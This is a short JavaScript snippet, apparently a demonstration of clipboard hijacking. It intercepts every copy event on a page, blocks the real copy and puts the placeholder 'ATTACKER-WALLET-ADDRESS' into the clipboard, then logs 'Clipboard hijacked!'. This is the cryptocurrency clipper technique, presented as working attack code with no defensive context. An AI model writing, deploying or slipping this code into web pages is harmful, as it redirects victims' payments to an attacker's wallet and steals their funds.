document.addEventListener('copy', (event) => {
    event.preventDefault(); // Prevents original copy action
    let clipboardText = 'ATTACKER-WALLET-ADDRESS'; // Replaces clipboard content
    event.clipboardData.setData('text/plain', clipboardText);
    console.log('Clipboard hijacked!');
});
